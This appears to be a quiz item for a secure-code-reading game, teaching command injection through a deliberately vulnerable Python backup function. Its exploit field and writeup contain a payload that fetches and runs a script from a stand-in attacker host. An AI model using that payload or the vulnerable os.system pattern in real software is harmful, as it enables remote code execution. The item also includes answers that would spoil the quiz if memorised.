@@ -1,0 +1,112 @@
+{
+  "id": "srd-0004",
+  "date": "2026-10-11",
+  "difficulty": "easy",
+  "language": "python",
+  "estimatedMinutes": 5,
+  "snippet": {
+    "files": [
+      {
+        "name": "backup.py",
+        "code": "import os\n\ndef backup_site(hostname):\n    # Ping the host, then rsync its web root into local backups.\n    os.system(\"ping -c 1 \" + hostname)\n    cmd = \"rsync -az %s:/var/www/ ./backups/%s/\" % (hostname, hostname)\n    os.system(cmd)\n    return \"./backups/\" + hostname\n\ndef handle_request(form):\n    host = form.get(\"host\")\n    return backup_site(host)\n",
+        "notes": {
+          "5": "Runs `ping` by handing a string to the system shell, with `hostname` appended to it.",
+          "6": "Builds an rsync command string with the hostname substituted in twice.",
+          "7": "Runs that rsync command through the shell.",
+          "8": "Returns the local path the backup was written to.",
+          "11": "Reads the `host` field straight from the incoming request.",
+          "12": "Passes it into backup_site."
+        }
+      }
+    ]
+  },
+  "stages": {
+    "line": {
+      "file": "backup.py",
+      "line": 5,
+      "yellowRadius": 2,
+      "maxGuesses": 5
+    },
+    "bugClass": {
+      "answer": "command-inj",
+      "options": [
+        "command-inj",
+        "sqli",
+        "path-traversal",
+        "ssrf",
+        "code-inj"
+      ]
+    },
+    "why": {
+      "answerIndex": 1,
+      "options": [
+        {
+          "label": "`ping` needs root privileges, so the call fails for unprivileged web users",
+          "whyWrong": "Privilege level isn't the issue; the problem is that the shell interprets the input before anything runs."
+        },
+        {
+          "label": "`os.system` hands the whole assembled string to `/bin/sh`, so shell metacharacters in `hostname` run as separate commands"
+        },
+        {
+          "label": "The return value exposes the internal backup directory path to the user",
+          "whyWrong": "Leaking a path name is minor and unrelated to the command execution flaw."
+        }
+      ]
+    },
+    "fix": {
+      "answerIndex": 2,
+      "options": [
+        {
+          "label": "Quote the hostname inside the shell string",
+          "diff": "-    os.system(\"ping -c 1 \" + hostname)\n+    os.system(\"ping -c 1 '\" + hostname + \"'\")",
+          "whyWrong": "Single quotes are defeated by a `'` in the input, which closes the quote and restarts command context. Quoting by hand is not a reliable boundary."
+        },
+        {
+          "label": "Remove semicolons from the hostname",
+          "diff": "+    hostname = hostname.replace(\";\", \"\")\n     os.system(\"ping -c 1 \" + hostname)",
+          "whyWrong": "Shells offer many other separators (`|`, `&&`, `$(...)`, backticks, newlines). Denylisting one character leaves the rest open."
+        },
+        {
+          "label": "Pass arguments as a list with shell=False (subprocess)",
+          "diff": "-    os.system(\"ping -c 1 \" + hostname)\n+    subprocess.run([\"ping\", \"-c\", \"1\", hostname], check=True)\n-    cmd = \"rsync -az %s:/var/www/ ./backups/%s/\" % (hostname, hostname)\n-    os.system(cmd)\n+    subprocess.run([\"rsync\", \"-az\", f\"{hostname}:/var/www/\", f\"./backups/{hostname}/\"], check=True)"
+        },
+        {
+          "label": "Run the commands as an unprivileged user",
+          "diff": "-    os.system(\"ping -c 1 \" + hostname)\n+    os.system(\"sudo -u nobody ping -c 1 \" + hostname)",
+          "whyWrong": "Dropping privileges limits blast radius but the input is still parsed by a shell, so arbitrary commands still run (as nobody)."
+        }
+      ]
+    }
+  },
+  "source": {
+    "origin": "original",
+    "license": "CC0-1.0",
+    "attribution": "SourceReadle original"
+  },
+  "training": {
+    "exploit": "Submit `host=localhost; curl http://evil.example/s | sh`. `ping -c 1 localhost` runs, then the shell sees the `;` and executes `curl ... | sh`, downloading and running the attacker's script as the web user. `$(...)`, backticks, `&&`, and `|` work too.",
+    "concepts": [
+      "CWE-78",
+      "OWASP A03:2021 Injection"
+    ],
+    "hints": {
+      "line": "Which calls pass a built-up string to the operating system?",
+      "bugClass": "The input reaches a shell, not a database.",
+      "why": "What does `/bin/sh` do with a `;` in the middle of the string?",
+      "fix": "Don't involve a shell at all — pass arguments as a list."
+    }
+  },
+  "writeup": {
+    "summary": "`os.system` hands its string to `/bin/sh`, so any shell metacharacter in `hostname` is interpreted. A host of `localhost; curl evil.sh | sh` runs the attacker's command. The fix stops using a shell at all: `subprocess.run([...])` with a list passes `hostname` as a single argv element, so it can never be parsed as a command. Note line 6 has the same flaw — a complete fix converts both calls.",
+    "readNext": [
+      {
+        "label": "Python subprocess security considerations",
+        "url": "https://docs.python.org/3/library/subprocess.html#security-considerations"
+      },
+      {
+        "label": "OWASP Command Injection",
+        "url": "https://owasp.org/www-community/attacks/Command_Injection"
+      }
+    ]
+  }
+}
